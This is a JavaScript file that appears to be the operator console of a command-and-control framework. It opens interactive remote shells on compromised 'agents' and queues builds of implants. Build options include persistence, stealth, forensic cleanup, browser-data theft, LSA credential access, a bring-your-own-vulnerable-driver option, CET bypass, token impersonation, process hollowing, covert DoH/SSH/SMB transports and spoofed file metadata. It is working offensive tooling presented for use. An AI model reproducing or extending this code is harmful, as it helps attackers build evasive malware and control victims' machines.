        brightYellow: "#e3b341", brightBlue: "#79c0ff", brightMagenta: "#d2a8ff",
        brightCyan: "#56d4dd", brightWhite: "#f0f6fc",
      },
      fontFamily: '"Cascadia Code", "Fira Code", "SF Mono", Consolas, "Courier New", monospace',
      fontSize: 14,
      cursorBlink: true,
      scrollback: 2000,
    });
    const container = $("terminal-container");
    container.innerHTML = "";
    term.open(container);
    term.onData((data) => sendShellInput(data));
  }

  async function openShell() {
    syncShellAgentSelect();
    const agentId = $("shell-agent-select").value;
    if (!agentId) { alert("Select an agent first."); return; }

    $("btn-shell-open").disabled = true;
    $("shell-status").textContent = "Connecting…";
    $("shell-status").className = "muted";

    try {
      const res = await api("/agents/" + encodeURIComponent(agentId) + "/shell", {
        method: "POST",
        body: "{}",
      });
      if (!res.ok) {
        const txt = await res.text();
        throw new Error(txt || res.statusText);
      }
      const { session_id } = await res.json();
      shellAgentId = agentId;
      shellSessionId = session_id;

      initTerm();
      $("shell-status").textContent = "Connected";
      $("shell-status").className = "muted connected";
      $("btn-shell-close").disabled = false;
      $("btn-shell-open").disabled = false;

      // 250ms polling interval for shell output
      shellPollTimer = setInterval(pollShellOutput, 250);
    } catch (e) {
      $("shell-status").textContent = "Failed: " + e.message;
      $("shell-status").className = "err";
      $("btn-shell-open").disabled = false;
    }
  }

  async function sendShellInput(data) {
    if (!shellSessionId) return;
    const encoded = btoa(data.split("").map(c => String.fromCharCode(c.charCodeAt(0) & 0xff)).join(""));
    try {
      await api(
        "/agents/" + encodeURIComponent(shellAgentId) +
        "/shell/" + encodeURIComponent(shellSessionId) + "/input",
        { method: "POST", body: JSON.stringify({ data: encoded }) }
      );
    } catch (e) {
      console.warn("shell input error", e);
    }
  }

  async function pollShellOutput() {
    if (!shellSessionId) return;
    try {
      const res = await api(
        "/agents/" + encodeURIComponent(shellAgentId) +
        "/shell/" + encodeURIComponent(shellSessionId) + "/output"
      );
      if (!res.ok) return;
      const { data } = await res.json();
      if (data && term) {
        try {
          // data is base64-encoded bytes from the agent
          const decoded = atob(data);
          term.write(decoded);
        } catch (_) {}
      }
    } catch (e) {
      console.warn("shell output poll error", e);
    }
  }

  async function closeShell() {
    if (shellPollTimer) { clearInterval(shellPollTimer); shellPollTimer = null; }
    if (shellAgentId && shellSessionId) {
      try {
        await api("/agents/" + encodeURIComponent(shellAgentId) + "/command", {
          method: "POST",
          body: JSON.stringify({ command: { CloseShell: { session_id: shellSessionId } } }),
        });
      } catch (_) {}
    }
    shellAgentId = null;
    shellSessionId = null;
    if (term) { term.write("\r\n\x1b[31m[session closed]\x1b[0m\r\n"); }
    $("btn-shell-close").disabled = true;
    $("shell-status").textContent = "Not connected";
    $("shell-status").className = "muted";
  }

  $("btn-shell-open").addEventListener("click", openShell);
  $("btn-shell-close").addEventListener("click", closeShell);

  // ── Builder ───────────────────────────────────────────────────────
  $("btn-gen-key").addEventListener("click", () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    $("build-key").value = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
  });

  /**
   * Read current feature checkbox state.
   */
  function getFeatures() {
    return {
      persistence: $("feat-persistence").checked,
      direct_syscalls: $("feat-direct-syscalls").checked,
      remote_assist: $("feat-remote-assist").checked,
      stealth: $("feat-stealth").checked,
      network_discovery: $("feat-network-discovery").checked,
      forensic_cleanup: $("feat-forensic-cleanup").checked,
      self_reencode: $("feat-self-reencode").checked,
      http_transport: $("feat-http-transport").checked,
      doh_transport: $("feat-doh-transport").checked,
      ssh_transport: $("feat-ssh-transport").checked,
      smb_pipe_transport: $("feat-smb-pipe-transport").checked,
      evasion_transform: $("feat-evasion-transform").checked,
      p2p: $("feat-p2p").checked,
      stack_spoof: $("feat-stack-spoof").checked,
      manual_map: $("feat-manual-map").checked,
      browser_data: $("feat-browser-data").checked,
      lsa_whisperer: $("feat-lsa-whisperer").checked,
      kernel_callback: $("feat-kernel-callback").checked,
      embedded_driver: $("feat-embedded-driver").checked,
      evanesco: $("feat-evanesco").checked,
      syscall_emulation: $("feat-syscall-emulation").checked,
      cet_bypass: $("feat-cet-bypass").checked,
      token_impersonation: $("feat-token-impersonation").checked,
      transacted_hollowing: $("feat-transacted-hollowing").checked,
      delayed_stomp: $("feat-delayed-stomp").checked,
    };
  }

  /** Apply feature object to checkboxes (for profile import). */
  function setFeatures(f) {
    f = f || {};
    const set = (id, val) => { const el = $(id); if (el) el.checked = !!val; };
    set("feat-persistence", f.persistence);
    set("feat-direct-syscalls", f.direct_syscalls);
    set("feat-remote-assist", f.remote_assist);
    set("feat-stealth", f.stealth);
    set("feat-network-discovery", f.network_discovery);
    set("feat-forensic-cleanup", f.forensic_cleanup);
    set("feat-self-reencode", f.self_reencode);
    set("feat-http-transport", f.http_transport);
    set("feat-doh-transport", f.doh_transport);
    set("feat-ssh-transport", f.ssh_transport);
    set("feat-smb-pipe-transport", f.smb_pipe_transport);
    set("feat-evasion-transform", f.evasion_transform);
    set("feat-p2p", f.p2p);
    set("feat-stack-spoof", f.stack_spoof);
    set("feat-manual-map", f.manual_map);
    set("feat-browser-data", f.browser_data);
    set("feat-lsa-whisperer", f.lsa_whisperer);
    set("feat-kernel-callback", f.kernel_callback);
    set("feat-embedded-driver", f.embedded_driver);
    set("feat-evanesco", f.evanesco);
    set("feat-syscall-emulation", f.syscall_emulation);
    set("feat-cet-bypass", f.cet_bypass);
    set("feat-token-impersonation", f.token_impersonation);
    set("feat-transacted-hollowing", f.transacted_hollowing);
    set("feat-delayed-stomp", f.delayed_stomp);
  }

  function fieldValue(id) {
    const el = $(id);
    return el && el.value ? el.value.trim() : "";
  }

  function optionalField(id) {
    const value = fieldValue(id);
    return value || null;
  }

  function optionalIntField(id, label) {
    const value = fieldValue(id);
    if (!value) return null;
    const parsed = Number.parseInt(value, 10);
    if (!Number.isInteger(parsed) || parsed < 0 || parsed > 65535) {
      throw new Error(label + " must be between 0 and 65535.");
    }
    return parsed;
  }

  function getTransportConfig(transport) {
    const config = {};
    if (transport === "http") {
      config.http_endpoint = optionalField("build-http-endpoint");
      config.http_host_header = optionalField("build-http-host-header");
    } else if (transport === "doh") {
      config.doh_server_url = optionalField("build-doh-server-url");
      config.doh_domain = optionalField("build-doh-domain");
    } else if (transport === "ssh") {
      config.ssh_host = optionalField("build-ssh-host");
      config.ssh_port = optionalIntField("build-ssh-port", "SSH port");
      config.ssh_username = optionalField("build-ssh-username");
      config.ssh_host_key_fingerprint = optionalField("build-ssh-host-key-fp");
      if (!config.ssh_username) throw new Error("SSH username is required for SSH transport.");
      const authType = fieldValue("build-ssh-auth-type") || "agent";
      if (authType === "password") {
        const password = fieldValue("build-ssh-password");
        if (!password) throw new Error("SSH password is required for password auth.");
        config.ssh_auth = { type: "password", password };
      } else if (authType === "key") {
        const keyPath = fieldValue("build-ssh-key-path");
        if (!keyPath) throw new Error("SSH key path is required for key auth.");
        config.ssh_auth = { type: "key", key_path: keyPath };
      } else {
        config.ssh_auth = { type: "agent" };
      }
    } else if (transport === "smb") {
      config.smb_pipe_host = optionalField("build-smb-pipe-host");
      config.smb_pipe_name = optionalField("build-smb-pipe-name");
      config.smb_pipe_mode = fieldValue("build-smb-pipe-mode") || "smb";
      config.smb_tcp_relay_port = optionalIntField("build-smb-tcp-relay-port", "SMB relay port");
    }
    return config;
  }

  function setOptionalField(id, value) {
    const el = $(id);
    if (el) el.value = value || "";
  }

  function setTransportConfig(config) {
    config = config || {};
    setOptionalField("build-http-endpoint", config.http_endpoint);
    setOptionalField("build-http-host-header", config.http_host_header);
    setOptionalField("build-doh-server-url", config.doh_server_url);
    setOptionalField("build-doh-domain", config.doh_domain);
    setOptionalField("build-ssh-host", config.ssh_host);
    setOptionalField("build-ssh-port", config.ssh_port);
    setOptionalField("build-ssh-username", config.ssh_username);
    setOptionalField("build-ssh-host-key-fp", config.ssh_host_key_fingerprint);
    setOptionalField("build-smb-pipe-host", config.smb_pipe_host);
    setOptionalField("build-smb-pipe-name", config.smb_pipe_name);
    setOptionalField("build-smb-tcp-relay-port", config.smb_tcp_relay_port);
    if ($("build-smb-pipe-mode")) $("build-smb-pipe-mode").value = config.smb_pipe_mode || "smb";

    const auth = config.ssh_auth || { type: "agent" };
    if ($("build-ssh-auth-type")) $("build-ssh-auth-type").value = auth.type || "agent";
    setOptionalField("build-ssh-password", auth.type === "password" ? auth.password : null);
    setOptionalField("build-ssh-key-path", auth.type === "key" ? auth.key_path : null);
  }

  function updateTransportConfigVisibility() {
    const transport = $("build-transport").value;
    const show = (id, visible) => { const el = $(id); if (el) el.hidden = !visible; };
    show("transport-config", transport !== "tls");
    show("transport-http", transport === "http");
    show("transport-doh", transport === "doh");
    show("transport-ssh", transport === "ssh");
    show("transport-smb", transport === "smb");
  }

  function updateEmbeddedDriverVisibility() {
    const el = $("embedded-driver-config");
    if (el) el.hidden = !$("feat-embedded-driver").checked;
  }

  $("build-transport").addEventListener("change", updateTransportConfigVisibility);
  updateTransportConfigVisibility();
  $("feat-embedded-driver").addEventListener("change", updateEmbeddedDriverVisibility);
  updateEmbeddedDriverVisibility();

  async function submitBuild() {
    const os = $("build-os").value;
    const arch = $("build-arch").value;
    const format = $("build-format").value;
    const host = $("build-host").value.trim();
    const port = parseInt($("build-port").value, 10);
    const transport = $("build-transport").value;
    const pin = $("build-pin").value.trim();
    const key = $("build-key").value.trim();
    const outDir = $("build-output-dir").value.trim();
    const sleepMs = parseInt($("build-sleep-ms").value, 10) || 5000;
    const jitter = parseInt($("build-jitter").value, 10) || 20;
    const killDate = $("build-kill-date").value || null;
    const seed = $("build-seed").value.trim() || null;
    let transportConfig;

    if (!host || !port || !pin || !key) {
      alert("Please fill in all connection details and encryption key.");
      return;
    }

    if (!/^[0-9a-fA-F]{64}$/.test(pin)) {
      alert("TLS fingerprint must be exactly 64 hexadecimal characters (SHA-256).");
      return;
    }

    try {
      transportConfig = getTransportConfig(transport);
    } catch (e) {
      alert(e.message);
      return;
    }

    // Collect PE artifact kit fields (only relevant for Windows)
    const versionInfo = (os === "windows") ? {
      file_version: $("build-version").value.trim() || null,
      file_description: $("build-filedesc").value.trim() || null,
      company_name: $("build-company").value.trim() || null,
      product_name: $("build-product").value.trim() || null,
      original_filename: $("build-origfilename").value.trim() || null,
    } : null;

    const req = {
      os, arch, format, transport,
      transport_config: transportConfig,
      features: getFeatures(),
      host, port, pin, key,
      sleep_ms: sleepMs,
      jitter,
      kill_date: killDate,
      seed,
      output_dir: outDir || null,
      version_info: versionInfo,
      manifest_preset: $("build-manifest").value || null,
      driver_path: $("byovd-driver-path") ? $("byovd-driver-path").value.trim() || null : null,
    };

    $("build-download").hidden = true;
    $("btn-build").disabled = true;
    const logEl = $("build-log");
    logEl.textContent = "Starting build...\n";
    logEl.className = "";

    try {
      const res = await fetch("/api/build", {
        method: "POST",
        headers: headers(),
        body: JSON.stringify(req),
      });

      const resData = await res.json();

      if (!res.ok) {
        logEl.textContent += "Error: " + (resData.error || res.statusText);
        logEl.className = "err";
        $("btn-build").disabled = false;
      } else {
        logEl.textContent += "Build queued.\nJob ID: " + resData.job_id + "\n";
        window.checkBuildStatus(resData.job_id);
      }
    } catch (e) {
      logEl.textContent += "\nRequest failed: " + e.message;
      logEl.className = "err";
      $("btn-build").disabled = false;
    }
  }

  $("btn-build").addEventListener("click", submitBuild);

  // ── Fetch TLS fingerprint from this server ─────────────────────
  if ($("btn-fetch-pin")) {
    $("btn-fetch-pin").addEventListener("click", async () => {
      try {
        const res = await api("/info/fingerprint");
        if (res.ok) {
          const data = await res.json();
          $("build-pin").value = data.fingerprint || data.sha256 || "";
        } else {
          alert("Failed to fetch fingerprint: " + res.statusText);
        }
      } catch (e) {
        alert("Fetch failed: " + e.message);
      }
    });
  }

  // ── Audit tab controls ─────────────────────────────────────────
  if ($("btn-clear-audit")) {
    $("btn-clear-audit").addEventListener("click", () => {
      $("audit").textContent = "";
      if ($("audit-count")) $("audit-count").textContent = "0 entries";
    });
  }

  if (token) {
    $("token").value = token;
    login();
  }

  // ── Profile Encryption / Decryption using WebCrypto AES-GCM ──────
  async function getCryptoKey(passphrase, salt) {
    const enc = new TextEncoder();
    const keyMaterial = await window.crypto.subtle.importKey(
      "raw", enc.encode(passphrase), { name: "PBKDF2" }, false, ["deriveBits", "deriveKey"]
    );
    return window.crypto.subtle.deriveKey(
      { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
      keyMaterial,
      { name: "AES-GCM", length: 256 },
      true, ["encrypt", "decrypt"]
    );
  }

  function uint8ArrayToBase64(bytes) {
    let binary = "";
    for (let i = 0; i < bytes.byteLength; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
  }

  function base64ToUint8Array(base64) {
    const binaryStr = window.atob(base64);
    const bytes = new Uint8Array(binaryStr.length);
    for (let i = 0; i < binaryStr.length; i++) {
      bytes[i] = binaryStr.charCodeAt(i);
    }
    return bytes;
  }

  $("btn-export-profile").addEventListener("click", async () => {
    const passphrase = $("profile-passphrase").value;
    if (!passphrase) { alert("Please provide a passphrase to encrypt the profile."); return; }
    let transportConfig;
    try {
      transportConfig = getTransportConfig($("build-transport").value);
    } catch (e) {
      alert(e.message);
      return;
    }

    const profileData = {
      os: $("build-os").value,
      arch: $("build-arch").value,
      format: $("build-format").value,
      transport: $("build-transport").value,
      transport_config: transportConfig,
      features: getFeatures(),
      host: $("build-host").value.trim(),
      port: parseInt($("build-port").value, 10) || 8444,
      pin: $("build-pin").value.trim(),
      key: $("build-key").value.trim(),
      sleep_ms: parseInt($("build-sleep-ms").value, 10) || 5000,
      jitter: parseInt($("build-jitter").value, 10) || 20,
      kill_date: $("build-kill-date").value || null,
      seed: $("build-seed").value.trim() || null,
      output_dir: $("build-output-dir").value.trim() || null,
      version_info: {
        file_version: $("build-version").value.trim() || null,
        file_description: $("build-filedesc").value.trim() || null,
        company_name: $("build-company").value.trim() || null,
        product_name: $("build-product").value.trim() || null,
        original_filename: $("build-origfilename").value.trim() || null,
      },
      manifest_preset: $("build-manifest").value || null,
    };

    try {
      const salt = window.crypto.getRandomValues(new Uint8Array(16));
      const iv = window.crypto.getRandomValues(new Uint8Array(12));
      const key = await getCryptoKey(passphrase, salt);
      const encodedData = new TextEncoder().encode(JSON.stringify(profileData));
      const ciphertext = await window.crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv }, key, encodedData
      );

      const payload = {
        salt: uint8ArrayToBase64(salt),
        iv: uint8ArrayToBase64(iv),
        ciphertext: uint8ArrayToBase64(new Uint8Array(ciphertext)),
      };

      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "orchestra_profile.enc.json";
      a.click();
    } catch (e) {
      alert("Encryption failed: " + e.message);
    }
  });

  $("btn-import-profile").addEventListener("click", async () => {
    const fileFile = $("profile-file").files[0];
    if (!fileFile) { alert("Please select a profile file."); return; }

    const passphrase = $("profile-passphrase").value;

    try {
      const text = await fileFile.text();
      let data = JSON.parse(text);
      if (data.ciphertext) {
        if (!passphrase) { alert("This profile is encrypted. Provide a passphrase."); return; }
        const salt = base64ToUint8Array(data.salt);
        const iv = base64ToUint8Array(data.iv);
        const ciphertext = base64ToUint8Array(data.ciphertext);
        const cryptoKey = await getCryptoKey(passphrase, salt);

        const decrypted = await window.crypto.subtle.decrypt(
          { name: "AES-GCM", iv: iv }, cryptoKey, ciphertext
        );
        data = JSON.parse(new TextDecoder().decode(decrypted));
      }

      if (data.os) $("build-os").value = data.os;
      if (data.arch) $("build-arch").value = data.arch;
      if (data.format && $("build-format")) $("build-format").value = data.format;
      if (data.transport && $("build-transport")) $("build-transport").value = data.transport;
      setTransportConfig(data.transport_config);
      updateTransportConfigVisibility();
      // Accept both old (syscalls/screencap/keylog) and current BuildFeatures keys.
      if (data.features) {
        const normalizedFeatures = { ...data.features };
        if (normalizedFeatures.direct_syscalls === undefined && normalizedFeatures.syscalls !== undefined) {
          normalizedFeatures.direct_syscalls = normalizedFeatures.syscalls || normalizedFeatures.screencap;
          normalizedFeatures.remote_assist = normalizedFeatures.screencap || normalizedFeatures.keylog;
        }
        setFeatures(normalizedFeatures);
      }
      if (data.host) $("build-host").value = data.host;
      if (data.port) $("build-port").value = data.port;
      if (data.pin) $("build-pin").value = data.pin;
      if (data.key) $("build-key").value = data.key;
      if (data.sleep_ms != null && $("build-sleep-ms")) $("build-sleep-ms").value = data.sleep_ms;
      if (data.jitter != null && $("build-jitter")) $("build-jitter").value = data.jitter;
      if (data.kill_date && $("build-kill-date")) $("build-kill-date").value = data.kill_date;
      if (data.seed && $("build-seed")) $("build-seed").value = data.seed;
      if (data.output_dir != null) $("build-output-dir").value = data.output_dir;
      if (data.version_info) {
        const vi = data.version_info;
        const set = (id, v) => { const el = $(id); if (el && v) el.value = v; };
        set("build-version", vi.file_version);
        set("build-filedesc", vi.file_description);
        set("build-company", vi.company_name);
        set("build-product", vi.product_name);
        set("build-origfilename", vi.original_filename);
      }
      if (data.manifest_preset && $("build-manifest")) $("build-manifest").value = data.manifest_preset;
      if (data.driver_path && $("byovd-driver-path")) {
        $("byovd-driver-path").value = data.driver_path;
        updateEmbeddedDriverVisibility();
      }

      alert("Profile loaded successfully.");
    } catch (e) {
      alert("Decryption or loading failed: " + e.message);
    }
  });
})();

// ── Build status polling (must be outside IIFE to be callable from inline code) ──
window.checkBuildStatus = async function(job_id) {
  const logEl = document.getElementById("build-log");
  const tok = sessionStorage.getItem("oc_token") || "";
  try {
    const res = await fetch("/api/build/status/" + job_id, {
      headers: { "Authorization": "Bearer " + tok, "Content-Type": "application/json" },
    });
    if (!res.ok) {
      logEl.textContent += "\nError fetching status: " + res.statusText;
      document.getElementById("btn-build").disabled = false;
      return;
    }
    const data = await res.json();
    const currentLog = data.log || "";
    if (currentLog) {
      logEl.textContent = "Job ID: " + job_id + "\n" + currentLog;
    }

    if (data.status === "Queued" || data.status === "Running") {
      setTimeout(() => window.checkBuildStatus(job_id), 2000);
    } else {
      document.getElementById("btn-build").disabled = false;
      if (data.status === "Completed") {
        logEl.className = "ok";
        const dload = document.getElementById("build-download");
        dload.hidden = false;
        document.getElementById("build-download-link").href =
          "/api/build/" + job_id + "/download?token=" + encodeURIComponent(tok);
      } else {
        logEl.className = "err";
      }
    }
  } catch (e) {
    logEl.textContent += "\nStatus check failed: " + e.message;
    document.getElementById("btn-build").disabled = false;
  }
};

